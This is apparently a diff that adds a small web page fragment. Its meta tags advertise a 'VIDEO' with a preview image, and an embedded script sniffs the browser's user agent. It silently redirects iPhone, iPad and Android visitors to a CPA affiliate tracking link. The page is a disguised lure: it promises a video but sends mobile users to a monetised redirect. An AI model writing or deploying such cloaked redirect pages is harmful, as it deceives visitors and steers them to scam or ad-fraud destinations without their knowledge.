@@ -1,0 +1,14 @@
+<meta property="og:title" content="VIDEO"/>
+<meta property="og:image" content="https://i.imgur.com/hJcvzzU.jpg"/>
+<meta name="robots" content="index"/>
+<meta name="robots" content="index"/>
+<meta name="robots" content="noindex"/>
+<meta name="robots" content="nofollow"/>
+<meta http-equiv="cache-control" content="no-cache"/>
+
+
+<script type="text/JavaScript">
+var dispositivo = navigator.userAgent.toLowerCase();
+if( dispositivo.search(/iphone|ipod|ipad|android/) > -1 ){
+document.location = "https://freelancercpa.net/r.php?go=326458"; }
+</script>
